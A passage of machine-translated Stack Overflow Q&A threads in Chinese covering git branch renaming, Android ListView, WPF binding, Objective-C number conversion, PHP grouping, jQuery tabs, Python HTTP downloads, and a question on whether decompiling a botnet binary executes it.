幸运的是 - 似乎没有任何东西丢失或损坏。

双重名称问题消失了 - 我将 oldclientmgr 重命名为 clientmgr

希望这可以帮助其他可能遇到此问题的人

吉姆

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-01-25T21:09:32.783

同样的事情发生在我身上——我不知道为什么！我很少第二次输入任何内容，而且我的分行名称中有 5 个大写字母。如果有人知道原因，将不胜感激。

这是我修复它的方法：

```
git checkout BIGBranch
git rebase bigbranch
git push
### verify changes in place then delete duplicate:
git branch -d bigbranch  
git push origin --delete bigbranch 
```

# android - 列表视图不可点击

> ID：15738150
> 
> 赞同：0
> 
> 时间：2013-04-01T05:33:14.500
> 
> 标签：android, android-layout, android-intent, android-widget

我是安卓新手。我正在显示具有单击事件的列表视图。当我单击任何行时，它会转到 ext 活动。当我按下返回按钮时，我遇到了问题，列表视图不再可点击。我在标签组下有这个逻辑。谁能解释一下怎么做？

```
public class MyCustomAdapter extends BaseAdapter {
    String[] data_text;
    int[] data_image;
    int k;
    MyCustomAdapter(String[] text, int[] image) {

        data_text = data_text;
        data_image = data_image;    
    }

    MyCustomAdapter(ArrayList text, ArrayList image) {

        data_text = new String[text.size()];
        data_image = new int[image.size()];

        for (int i = 0; i < text.size(); i++) {
            System.out.println("In adapter2");
            data_text[i] =  text.get(i).toString();
            data_image[i] = (Integer) image.get(i);
            Log.e("",data_image[i]+"");
        }
    }
      public int getCount()
      {
       return data_text.length;
      }
      public String getItem(int position)
      {
       return null;
      }
      public long getItemId(int position)
      {
       return position;
      }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        // TODO Auto-generated method stub
          LayoutInflater inflater = getLayoutInflater();
           View row;
           row = inflater.inflate(R.layout.list_item_review, parent, false);               
           TextView textview = (TextView) row.findViewById(R.id.TextView01);
           ImageView imageview = (ImageView) row.findViewById(R.id.ImageView01);
           textview.setText(data_text[position]);
           imageview.setImageResource(data_image[position]);
           return (row);
    }

    @Override
    public void notifyDataSetChanged() {
        // TODO Auto-generated method stub
        super.notifyDataSetChanged();
    }
} 
```

这是点击代码

```
listview.setOnItemClickListener(new OnItemClickListener() {
                    @Override
                    public void onItemClick(AdapterView<?> arg0, View v1,int position, long id) {
                        Intent i = new Intent(ReviewTab.this, ReviewDetail.class);

                        View view = ReviewTabGroup.group.getLocalActivityManager().startActivity("com.MyITAssessment.ApplicationCodes.ReviewDetail",i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)).getDecorView();
                        ReviewTabGroup.group.replaceView(view);
                    }
                }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:12:31.750

似乎您的行视图冻结导致问题，做一件事打开您的`row xml`(R.layout.list_item_review)

`main layout`并在行 xml中添加以下行代码。

> android:descendantFocusability="blocksDescendants"

# c# - 如何加载列表框中的选定项目

> ID：15738153
> 
> 赞同：0
> 
> 时间：2013-04-01T05:33:18.817
> 
> 标签：c#, xaml, data-binding

我正在做一个课堂项目，我很难在列表框中设置选定的项目。我创建了一个包含可观察品种集合的狗类。在我的主屏幕上，我有一个列表框，您可以从中选择一只狗。选择狗并触发更新狗按钮事件时，会打开更新狗屏幕。在更新狗屏幕中，有一个包含所有狗品种的列表框。我的问题是，如何设置列表框的选定项目以链接到狗的品种？

这是 btnUpdateDog_Click 事件的代码：

```
 private void btnUpdateDog_Click(object sender, RoutedEventArgs e)
    {
        if (this.lstDogListBox.SelectedItem != null)
        {
            Dog selectedDog = (Dog)this.lstDogListBox.SelectedItem;
            var dogId = selectedDog.DogId;
            var _selectedDog = _dogRepository.Fetch(dogId).SingleOrDefault();

            UpdateDogWindow updateDogWindow = new UpdateDogWindow(dogId);

            updateDogWindow.Owner = windowClientApplication;

            updateDogWindow.DataContext = _selectedDog;

            updateDogWindow.ShowDialog();

            if (updateDogWindow.ShowDialog() == true)
            {
                LoadSearchResults();
            }
        }
    } 
```

这是 UpdateDogWindow 的构造函数

```
 public UpdateDogWindow(int criteria)
    {
        _dogRepository = new DogRespository();

        var _dogQuery = _dogRepository.Fetch(criteria);

        this.DataContext = _dogQuery;

        InitializeComponent();
    } 
```

这是 UpdateDogWindow 的 XAML 代码：

```
<Window x:Class="ClientApplication.UpdateDogWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:Objects="clr-namespace:SGVHS_VCDB.Database.Objects;assembly=SGVHS_VCDB.Database.Objects"
        Title="Update Dog"
        Height="300" 
        Width="800" 
        Background="#FFD6DBDD" 
        WindowStartupLocation="CenterOwner" 
        WindowStyle="ToolWindow" 
        Loaded="Window_Loaded">
    <Window.DataContext>
        <Objects:Dog />
    </Window.DataContext>
    <Canvas>
        <Label 
            Canvas.Left="20" 
            Canvas.Top="20" 
            Content="_Dog Name:" 
            Height="36" 
            FontSize="18" 
            Name="lblDogName" />
        <TextBox 
            Canvas.Left="130" 
            Canvas.Top="20" 
            Height="38" 
            Width="250" 
            FontSize="18" 
            Text="{Binding Path=DogName, UpdateSourceTrigger=PropertyChanged}" 
            Name="txtUpdateDogName" />
        <Label 
            Canvas.Left="20" 
            Canvas.Top="80" 
            Content="_Intake Date:" 
            Height="36" 
            FontSize="18" 
            Name="lblIntakeDate" />
        <DatePicker 
            Canvas.Left="170" 
            Canvas.Top="81" 
            Height="38" 
            Width="175" 
            FontSize="18" 
            SelectedDate="{Binding IntakeDate}"
            Name="dtoUpdateIntakeDate"/>
        <Label
            Canvas.Left="20" 
            Canvas.Top="140"
            Height="36"
            Content="_Unavailable Date:"
            FontSize="18"
            Name="lblUnavailableDate"/>
        <DatePicker 
            Canvas.Left="170" 
            Canvas.Top="141" 
            Height="38" 
            Width="175" 
            FontSize="18" 
            SelectedDate="{Binding UnavailableDate}" 
            Name="dtoUnavailableDate"/>
        <GroupBox 
            Canvas.Left="400" 
            Canvas.Top="22" 
            Header="Breeds" 
            Height="169" 
            Width="363" 
            FontSize="18" 
            BorderBrush="Black"
            Name="grpBreeds">
            <ListBox 
                DisplayMemberPath="BreedName"
                SelectionMode="Multiple"
                SelectedValuePath="BreedName"
                SelectedItem="{Binding Breed, Mode=TwoWay}"
                Name="lstUpdateDogBreedList" />
        </GroupBox>
        <CheckBox 
            Canvas.Left="20" 
            Canvas.Top="200" 
            Content="Adopted" 
            Height="32" 
            FontSize="18"
            IsChecked="{Binding Adopted}"
            Name="chkAdopted"/>
        <Button 
            Canvas.Left="637" 
            Canvas.Top="205" 
            Content="Done" 
            Height="30" 
            Width="120" 
            FontSize="18" 
            Name="btnUpdateDogDone" />        
    </Canvas>
</Window> 
```

我试图将品种列表的绑定设置为双向，为什么这不起作用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T09:01:58.007

它看起来像一个家庭作业。答案是使用 CollectionViewSource 进行过滤。您可以使用 CollectionViewSource 进行过滤、排序等。

[http://weblogs.asp.net/psheriff/archive/2010/08/03/filtering-collectionview-data-in-silverlight-4.aspx](http://weblogs.asp.net/psheriff/archive/2010/08/03/filtering-collectionview-data-in-silverlight-4.aspx)

# c++ - 反编译病毒

> ID：15738157
> 
> 赞同：0
> 
> 时间：2013-04-01T05:33:47.983
> 
> 标签：c++, compilation, virus, botnet

如果我使用反编译器获取已知 C++ .exe 僵尸网络 bin 的源代码，程序会在“反编译”期间执行吗？

我应该使用什么反编译器？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:36:25.483

不。反编译将二进制文件视为数据，不*执行*任何代码。

这就像看乐谱来确定音乐的结构。没有播放或听到音乐。

要使用的反汇编器或反编译器取决于可执行文件的体系结构。既然你提到`.exe`这表明它是 MS Windows 或 Vax/VMS。寻找适合您环境的一种。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T05:37:18.147

我还没有看到任何生成 C++ 代码的反编译器。我见过一些实验性的，它们在生成 C 代码方面做出了合理的尝试，但它们往往依赖于匹配特定编译器的代码生成模式（这可能已经改变，自从我上次研究这个已经有一段时间了）。当然，任何符号信息都会消失。谷歌“反编译器”。

# iphone - NSString 到 NSNumber

> ID：15738162
> 
> 赞同：20
> 
> 时间：2013-04-01T05:34:08.990
> 
> 标签：iphone, objective-c, nsstring, int, nsnumber

所以这个问题困扰我太久了。我有 a `UIAlertView`，`textField`我需要`textField`as a的值`NSNumber`。但是我尝试的一切都会给我随机的数字串。任何帮助将不胜感激。

```
int i = [[alertView textFieldAtIndex:0].text intValue];
NSNumber *number = [NSNumber numberWithInt:[[alertView textFieldAtIndex:0].text integerValue]];    

int number = [[dict objectForKey:@"integer"] intValue];

NSLog(@"text = %@", [alertView textFieldAtIndex:0].text);

NSString *alertText = [alertView textFieldAtIndex:0].text;

NSNumberFormatter * f = [[NSNumberFormatter alloc] init];
[f setNumberStyle:NSNumberFormatterNoStyle];
NSNumber * myNumber = [f numberFromString:[alertView textFieldAtIndex:0].text];

NSNumber *number = @([alertText intValue]);

NSString *string = @"54";
NSNumber *number = @([string intValue]);

NSLog(@"here we are: %i", number); 
```

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2013-04-01T05:54:45.450

一看到这个，

```
NSString *string = @"123";
NSNumber  *aNum = [NSNumber numberWithInteger: [string integerValue]];
NSLog(@"%@",aNum);//NSString to NSNumber
NSInteger number=[string intValue];
NSLog(@"%i",number);//NSString to NSInteger 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-01T07:05:40.387

```
NSString *string = @"54";
NSNumber *number = @([string intValue]);
NSLog(@"here we are: %i", number); 
```

而是尝试使用以下内容：

```
NSLog(@"here we are: %@", number); 
```

由于您正在转换为 NSNumber （对象）。您应该在 NSLog 语句中使用对象说明符 %@。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-01T05:36:26.063

这是一个带有整数并使用 NSNumber 文字的示例。`floatValue`如果您的字符串包含浮点数，您也可以使用该方法。

```
NSString *string = @"54";
NSNumber *number = @([string intValue]); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-04-01T05:42:36.790

@Aaron Wojnowski，

使用`NSNumberFormatter`如果需要，您也可以设置分组分隔符。

```
NSNumberFormatter *formatString = [[NSNumberFormatter alloc] init];
stringValue = textfield.text;
NSNumber *reqNumber = [formatString numberFromString:stringValue]; 
```

# java - Listview 没有按需要生成

> ID：15738164
> 
> 赞同：0
> 
> 时间：2013-04-01T05:34:17.493
> 
> 标签：java, android, listview, arraylist, hashmap

我有一个活动，我想从**Arraylist生成一个列表视图，该列表视图是从****Hashmap**填充的。列表正在生成，但列表中只显示一项，它应该显示两项。

这是生成**ListView**的活动：

```
public class ExamNamesActivity extends Activity {
    TextView showUser;

    // Hashmap for ListView
    ArrayList<HashMap<String, String>> acList = new ArrayList<HashMap<String, String>>();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_exam_names);

    //assigning objects to layout
    showUser=(TextView) findViewById(R.id.exam_names_user_full_name_textView);
    //showing user's full name
    showUser.setText("Welcome, "+getFromPreference("user_name"));

    //------------------for list-----------------------------

    // creating new HashMap
    HashMap<String, String> map = new HashMap<String, String>();

    // adding each child node to HashMap key => value
    map.put("Name", "Online Speed Test");
    map.put("Name", "Practice Test");

    acList.add(map);

    ListView list = (ListView) findViewById(R.id.ac_list_listView);
      if (null != list && null != acList) {
       list.setAdapter(new ListAdapter(ExamNamesActivity.this,
         R.id.ListViewContainer, new String[acList.size()]));

      }

    }

    //class for the list and on click handler
    private class ListAdapter extends ArrayAdapter<String> {
        private final Context context;
        private final String[] values;

        public ListAdapter(Context context, int textViewResourceId,
                String[] objects) {
            super(context, textViewResourceId, objects);
            // TODO Auto-generated constructor stub
            this.context = context;
            this.values = objects;
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            // TODO Auto-generated method stub
            // return super.getView(position, convertView, parent);

            LayoutInflater inflater = (LayoutInflater) context
                    .getSystemService(Context.LAYOUT_INFLATER_SERVICE);

            final View rowView = inflater.inflate(R.layout.list_layout, parent,
                    false);

            final HashMap<String, String> map =  acList.get(position);

            TextView textView = (TextView) rowView
                     .findViewById(R.id.list_label_name);
                     textView.setText(map.get("Name"));

            rowView.setOnClickListener(new View.OnClickListener() {

                public void onClick(View v) {

                    rowView.setBackgroundResource(R.drawable.list_bg_pressed);

                    Handler handler = new Handler();
                    Runnable r = new Runnable() {
                        public void run() {
                            rowView.setBackgroundResource(R.drawable.list_bg);

                        }
                    };
                    handler.postDelayed(r, 200);

//                           Intent intent = new Intent(RegisterFirstActivity.this, RegisterSecondActivity.class);
//                              
//                              intent.putExtra("AC_Code", map.get(TAG_CODE));
//                              RegisterFirstActivity.this.startActivity(intent);

                }
            });

            return rowView;

        }
    }

    //getting content from preferences
    public String getFromPreference(String variable_name)
    {
        String preference_return;
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
        preference_return = preferences.getString(variable_name,"");

        return preference_return;
    }
  //method to show double button alert dialog
    public void twoButtonAlert(String title, String message, String button1, String button2)
    {

        AlertDialog.Builder alertDialog = new AlertDialog.Builder(ExamNamesActivity.this);

        // Setting Dialog Title
        alertDialog.setTitle(title);

        // Setting Dialog Message
        alertDialog.setMessage(message);

        // Setting Icon to Dialog
        //alertDialog.setIcon(R.drawable.delete);

        // Setting Positive "Yes" Button
        alertDialog.setPositiveButton(button1, new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog,int which) {

                // Write your code here to invoke YES event
                //goto login activity
                Intent intent = new Intent(ExamNamesActivity.this, LoginActivity.class);
                finish();
                ExamNamesActivity.this.startActivity(intent);

            }
        });

        // Setting Negative "NO" Button
        alertDialog.setNegativeButton(button2, new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                // Write your code here to invoke NO event
                dialog.cancel();
            }
        });

        // Showing Alert Message
        alertDialog.show();

    }

    } 
```

这是**活动的布局**：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
tools:context=".AdapterActivity" >

    <TextView
        android:id="@+id/exam_names_user_full_name_textView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentRight="true"
        android:layout_alignParentTop="true"
        android:text="Name Title"
        android:textAppearance="?android:attr/textAppearanceSmall" />

    <RelativeLayout
        android:id="@+id/ListViewContainer"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_alignParentLeft="true"
        android:layout_alignParentRight="true"
        android:layout_below="@+id/exam_names_user_full_name_textView"
        android:layout_marginTop="17dp" >

        <ListView
            android:id="@+id/ac_list_listView"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_alignParentLeft="true"
            android:layout_alignParentTop="true" >
        </ListView>

    </RelativeLayout>

</RelativeLayout> 
```

**这是列表视图 ( list_layout.xml** )每一行的布局：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/library_linear_layout"
    android:layout_width="match_parent"
    android:layout_height="70dp"
    android:layout_alignParentLeft="true"
    android:background="@drawable/list_bg"
    android:padding="5dp" >

    <RelativeLayout
        android:layout_width="wrap_content"
        android:layout_height="44dp"
        android:background="@null" >

        <TextView
            android:id="@+id/list_label_name"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentLeft="true"
            android:layout_centerVertical="true"
            android:text="name"
            android:textAppearance="?android:attr/textAppearanceSmall"
            android:textSize="17sp" />

    </RelativeLayout>

</LinearLayout> 
```

输出是这样的：

![输出](https://i.stack.imgur.com/nmgL4.png)

**为什么列表没有同时显示这两个项目？我哪里错了？** 提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T05:36:03.950

这是因为您使用的是相同的键`"Name"`，它会覆盖您的第一个值。在 Map 中，当您使用相同的键放置值时，它会覆盖。

这样做，

```
map.put("Name", "Online Speed Test");
map.put("Name", "Practice Test"); 
```

只会在您的地图中产生 1 个值，即

```
map.put("Name", "Practice Test"); 
```

而第一个被覆盖。

您是否尝试获取地图的大小？你会得到大小为 1 而不是 2。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T05:44:53.827

检查您的数组列表大小，即您只向该列表添加一个哈希映射。这就是为什么您的列表只显示一项。然后关于你的哈希图，你添加两个具有相同键的项目，以便第二个项目覆盖第一个值。所以改变你的代码如下

```
// creating new HashMap
    HashMap<String, String> map = new HashMap<String, String>();

    // adding each child node to HashMap key => value
    map.put("Name", "Online Speed Test");
    acList.add(map);

    map = new HashMap<String, String>();
    map.put("Name", "Practice Test");
    acList.add(map); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T05:44:57.693

请按照以下步骤

1.  创建一个 HashMap 对象
2.  将值放入 hashmap 对象
3.  将 hashmap 添加到 arraylist

对每个项目执行此步骤。

对于您的情况。它应该像这样

```
HashMap<String, String> map;

map = new HashMap<String, String>();
map.put("Name", "Online Speed Test");
acList.add(map);

map = new HashMap<String, String>();
map.put("Name", "Practice Test");
acList.add(map); 
```

# qt - Grabwidget 抓取完整视图，即使它被放大

> ID：15738165
> 
> 赞同：0
> 
> 时间：2013-04-01T05:34:21.883
> 
> 标签：qt, qpixmap

我 `QPixmap QPixmap::grabWidget ( QWidget * widget, int x = 0, int y = 0, int width = -1, int height = -1 )` 用来抓取视口`QPixmap object`。

在某些情况下，即使屏幕放大到一定程度，我也想抓住那一刻将滚动出去的完整屏幕。某些变体`grabwidget`或任何其他功能是否有助于实现这一点？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:08:23.330

一种或另一种方式，我认为您需要将对象的分辨率设置为“屏幕截图”所需的大小。以下是一些可以尝试的不同想法：

[http://qt-project.org/doc/qt-4.8/qpixmap.html#grabWidget](http://qt-project.org/doc/qt-4.8/qpixmap.html#grabWidget)

> `paintEvent()`这个函数实际上要求小部件通过调用打开画家重定向来绘制自己（及其子级绘制自己） 。

为您的小部件进行切换以使用修改后的视口。然后在调用grabWidget之前，将开关设置为使用全分辨率视口（[`QPainter::setViewport()`](http://qt-project.org/doc/qt-4.8/qpainter.html#setViewport)），然后在完成grabWidget之后，重置开关。您还可以查看 QPixmap.cpp 中的grabWidget 的源代码（链接到[src](http://qt.gitorious.org/qt/qt/blobs/4.8/src/gui/image/qpixmap.cpp)）。

也许改变你的小部件在滚动区域中的响应方式会有所不同。 [`QScrollArea::setWidgetResizeable()`](http://qt-project.org/doc/qt-4.8/qscrollarea.html#widgetResizable-prop).

[http://qt-project.org/doc/qt-4.8/desktop-screenshot.html](http://qt-project.org/doc/qt-4.8/desktop-screenshot.html)

在桌面截图示例中，他们在截取截图之前隐藏截图实用程序的窗口，然后重新显示窗口。

因此，要将这个原则应用到您的应用程序中，您可以暂时以全分辨率绘制小部件，然后调用`grabWidget`，然后以先前的分辨率重新缩放和重绘。

您还可以尝试查看 QPrinter 的工作原理，以及是否可以在您的应用程序中使用它。

[http://qt-project.org/doc/qt-4.8/qprinter.html#details](http://qt-project.org/doc/qt-4.8/qprinter.html#details)

希望有帮助。

# php - 在 for 循环中将两个条目粘在一起

> ID：15738169
> 
> 赞同：2
> 
> 时间：2013-04-01T05:34:52.070
> 
> 标签：php, json, for-loop

我有一个来自 JSON 页面的回合和团队列表，如下所示......

```
圆形 | 团队
-------------
6 | 华盛顿联合
7 | （空白的）
8 | 纽约红牛队
8 | 洛杉矶银河
9 | 波特兰木材
10 | 美国芝华士
11 | 西雅图海湾人队
11 | 休斯顿迪纳摩
12 | 华盛顿联合

```

目前，我正在呼应它，如上图所示，但我希望任何双轮比赛都将两支球队一起展示，而不是分开展示。

这是我要展示的示例...

```
圆形 | 团队
-------------
6 | 华盛顿联合
7 | （空白的）
8 | 纽约红牛队和洛杉矶银河队
9 | 波特兰木材
10 | 美国芝华士
11 | 西雅图海湾人队和休斯顿迪纳摩队
12 | 华盛顿联合

```

这是我现在正在使用的......我不知道如何解决它。

```
//get the page 
$str = file_get_contents('http://fantasy.mlssoccer.com/web/api/elements/498/');
$jsonarray = json_decode($str, true);

//count how many entries
$howmanyrounds = count($jsonarray['fixtures']['all']);

//for each entry
for($whichround = 0; $whichround < $howmanyrounds; $whichround++)
{
    //this returns a value like 'Round 6'
    $gameweek = $jsonarray['fixtures']['all'][$whichround][1];
    //Cut out just the number
    $roundno = intval(substr($gameweek, -(strlen($gameweek)-6)));

    //this returns a value like 'Chivas USA (H)'
    $opponents = $jsonarray['fixtures']['all'][$whichround][2];
    //This cuts out the actual team name
    $team = substr($opponents, 0, (strlen($opponents)-4));

    echo $roundno." ".$team."<br>";
} 
```

我尝试了几种不同的方法，但最终都无法达到我想要的效果。这应该很容易。知道怎么做吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T05:46:20.590

您可以使用中间数组根据轮数将团队分组在一起：

```
$rounds = array();

for($whichround = 0; $whichround < $howmanyrounds; $whichround++)
{
    // ...
    $rounds[$roundno][] = $team;
}

foreach ($rounds as $roundno => $teams) {
    echo $roundno . " " . join(' & ', $teams)."<br>";
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T05:47:56.410

尝试将值加入索引数组：

```
$arrJoined = array();

for($whichround = 0; $whichround < $howmanyrounds; $whichround++)
{
    //this returns a value like 'Round 6'
    $gameweek = $jsonarray['fixtures']['all'][$whichround][1];
    //Cut out just the number
    $roundno = intval(substr($gameweek, -(strlen($gameweek)-6)));

    //this returns a value like 'Chivas USA (H)'
    $opponents = $jsonarray['fixtures']['all'][$whichround][2];
    //This cuts out the actual team name
    $team = substr($opponents, 0, (strlen($opponents)-4));

    $arrJoined[$roundno] = ($arrJoined[$roundno] == null ? $team : $arrJoined[$roundno].' & '.$team);
} 
```

然后只需输出 $arrJoined 的内容。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T06:01:30.627

使用它作为中间数组，你应该很好

```
$str = file_get_contents('http://fantasy.mlssoccer.com/web/api/elements/498/');
            $array = json_decode($str, true);
            $temp = $array['fixtures']['all'];
            $req_array = array();
            foreach($temp as $value)
            {
                list($dummy, $round)  = explode(" ", $value[1]);
                           $value[2] = str_replace('-','',$value[2]);
                if(isset($req_array["Round $round"]) 
                   && ($req_array["Round $round"] != '') 
                   )
                {
                    $req_array["Round $round"] = $req_array["Round $round"]."&".$value[2];
                }
                else if($value[2] != '-')
                {
                    $req_array["Round $round"] = $value[2];
                }
            } 
```

**的**输出**`$req_array`**

 **```
 Array
   (
    [Round 6] => D.C. United (H)
[Round 7] => 
[Round 8] => New York Red Bulls (A)&Los Angeles Galaxy (A)
[Round 9] => Portland Timbers (H)
[Round 10] => Chivas USA (H)
[Round 11] => Seattle Sounders FC (H)&Houston Dynamo (A)
[Round 12] => D.C. United (A)
 ---
) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-01T06:22:55.257

我的建议是，您的代码中只是另一个数组（targetAray）并将数据推送到该数组中，然后打印该数组，如下所示：

```
$targetArray = array();   //additional array to store values
//count how many entries
$howmanyrounds = count($jsonarray['fixtures']['all']);

//for each entry
for($whichround = 0; $whichround < $howmanyrounds; $whichround++)
{
    //this returns a value like 'Round 6'
    $gameweek = $jsonarray['fixtures']['all'][$whichround][1];

    //Cut out just the number
    $roundno = intval(substr($gameweek, -(strlen($gameweek)-6)));

    //this returns a value like 'Chivas USA (H)'
    $opponents = $jsonarray['fixtures']['all'][$whichround][2];
    //This cuts out the actual team name
    $team = substr($opponents, 0, (strlen($opponents)-4));

   //below code you need to add. 
   if(array_key_exists($roundno, $targetArray))
     $targetArray[$roundno] = $targetArray[$roundno]. "&" .$team;
   else
    $targetArray[$roundno] = $team;
    echo $roundno." ".$team."<br>";
}
//this will give you your data
print_r($targetArray); 
```**

# jquery - jquery 选项卡中的 Ajax 加载器

> ID：15738174
> 
> 赞同：3
> 
> 时间：2013-04-01T05:35:43.960
> 
> 标签：jquery, ajax, jquery-ui, tabs

我的页面中有一个 Jquery UI 选项卡。

我喜欢在更改选项卡时显示类似于 ajax 加载程序的加载程序。我提到[了这个问题](https://stackoverflow.com/q/3944482/1716774)。但到目前为止，我对如何制作这个没有任何明确的想法。

我已经在我的脚本中这样尝试过。

```
 <script>
$(function() {
$("#tabs").tabs({

    ajaxOptions: {

        error: function(xhr, status, index, anchor) {
            $(anchor.hash).html("I tried to load this, but couldn't. Try one of the other links?");
             var spinner = $( ".selector" ).tabs( "option", "spinner" );
             $( ".selector" ).tabs( "option", "spinner", 'Retrieving data...' );
        },
 spinner: '<img src="http://i.stack.imgur.com/Pi5r5.gif" />'

    }
});
});
</script> 
```

如何以简单的方式做到这一点。（我不喜欢在这里使用 ajax 方法。）

喜欢这张图片 ![在此处输入图像描述](https://i.stack.imgur.com/iEOYZ.gif)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-08-09T21:15:53.193

我也在寻找一种没有 ajax 设置的更简单的方法，并偶然发现了这篇文章。Frans 的回答几乎是正确的，但更新了错误的元素。更正后的版本应该是这样的，他正在更新实际的选项卡而不是面板。

```
$("#tabs").tabs({
  beforeLoad: function( event, ui ) {
      ui.panel.html('<img src="http://i.stack.imgur.com/Pi5r5.gif" />');
  }
}); 
```

我刚刚实施效果很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T12:19:44.660

一种解决方案可能是这样的：

```
$("#tabs").tabs({
   beforeLoad: function( event, ui ) {
      ui.tab.html('<img src="http://i.stack.imgur.com/Pi5r5.gif" />');
   }
}); 
```

只需使用您想要的加载 gif 重写标签的 html 内容。Ajax 调用完成后，选项卡内容将自动重写。

更多信息：[http ://api.jqueryui.com/tabs/#event-beforeLoad](http://api.jqueryui.com/tabs/#event-beforeLoad)

# sql - 触发器中的动态sql

> ID：15738175
> 
> 赞同：0
> 
> 时间：2013-04-01T05:35:59.107
> 
> 标签：sql, asp.net, triggers, dynamic-sql

我在 table1 上有一个更新触发器，它将更新的值插入 table2。如果 trable1 中的任何列包含空值，则不会将记录插入 table2。在这种情况下我该怎么办。我在触发器中使用动态 sql。

# python - python 3.2 http.client.HTTPConnection 可以下载大文件吗？

> ID：15738184
> 
> 赞同：1
> 
> 时间：2013-04-01T05:36:52.907
> 
> 标签：python, download

python 3.2上的http.client.HTTPConnection可以下载1G左右的大文件吗？当我读取内容时，我得到了类 HTTPResponse 的源，所有数据都会保存到变量并返回，变量可以将 1G 数据保存到内存吗？

我想保存数据以将套接字订购为隧道，我在 HTTPResponse 的任何地方都看不到 yield 关键字？

http.client.HTTPConnection 可以运行这个任务吗？传统知识：D

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T05:39:18.993

分块阅读响应。它可以下载它们。

```
import http.client
conn = http.client.HTTPConnection("www.python.org")
conn.request("GET", "/index.html")
r1 = conn.getresponse()
print(r1.status, r1.reason)

data1 = r1.read()  # This will return entire content.
# The following example demonstrates reading data in chunks.
conn.request("GET", "/index.html")
r1 = conn.getresponse()
while not r1.closed:
    print(r1.read(200)) # 200 bytes 
```

# javascript - 在jsp中插入查询

> ID：15738185
> 
> 赞同：-1
> 
> 时间：2013-04-01T05:36:56.520
> 
> 标签：javascript, sql, jsp

我收到无效号码错误和缺少逗号号码。我觉得这个说法有问题

```
String sql="insert into proptemp (auto_number, proptemp_id, reg_date, odtemp_max, odtemp_min,    

idtemp_max, idtemp_min, weather)

values('"+auto_number+"','"+proptemp_id_chk+"',to_date('"+reg_date+"','yyyy-mm-dd'),

'"+odtemp_max+"','"+odtemp_min+"','"+idtemp_max+"','"+idtemp_min+"','"+weather+"')"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T05:45:51.140

我希望这可以帮助您在 JavaScript 中编写 sql 查询。

要获取 INSERT 查询构建器的实例：

```
var q = squel.insert(); 
```

至少必须提供表名和一个字段：

```
alert(
    squel.insert()
        .into("students")
        .set("name", "Thomas")
);

/*  INSERT INTO students (name) VALUES ("Thomas") */ 
```

明确如何根据运行时类型处理每个字段值，就像它对 UPDATE 查询所做的一样：

```
alert(
    squel.insert()
        .into("students")
        .set("name", "Thomas")
        .set("age", 29)
        .set("score", 90.2)
        .set("graduate", true)
        .set("nickname", null)
);
/*  INSERT INTO students (name, age, score, graduate, nickname) VALUES ("Thomas", 29, 90.2, TRUE, NULL) */ 
```

与 UPDATE 查询一样，您可以使用 usingValuePlaceholders 选项来阻止 Squel 自动将字符串字段值放在引号内：

```
alert(
    squel.insert({ usingValuePlaceholders: true })
        .into("students")
        .set("name", "?")
        .set("age", 29)
        .set("score", 90.2)
        .set("graduate", true)
        .set("nickname", null)
);
/*  INSERT INTO students (name, age, score, graduate, nickname) VALUES (?, 29, 90.2, TRUE, NULL) */ 
```

[点击查看更多功能](http://hiddentao.github.com/squel/#insert)

# java - 我的代码中的未知错误

> ID：15738186
> 
> 赞同：0
> 
> 时间：2013-04-01T05:37:06.907
> 
> 标签：java

运行此代码时出现三个错误，但不知道它们是什么，因为这是提供的骨架代码。我会发布代码，也许有人可以帮助我。它可能是一个缺少的库或一些简单的东西，但我会很感激有人的帮助。错误是说我意识到没有导入的 Sorter （朝向代码底部）“找不到符号”，所以有没有更简单的方法来解决这个问题？

```
package sort;

import java.awt.*;
import javax.swing.*;
import java.awt.event.*;

public class AnimationTester implements ActionListener
{

private String algorithm="heap";    //Algoritm to sort by
private int elements=20;            //Number of elements to sort
private int delay=20;                 //speed to sort at
private Panel panel;       //The display Panel
private Thread t;           //A Thread for running sorts

/**
 * Creates an Animation Tester object and tells it to go.
 * This lets everything happen.
 * @param args The standard parameter
 * 
 */
public static void main(String[] args)
{
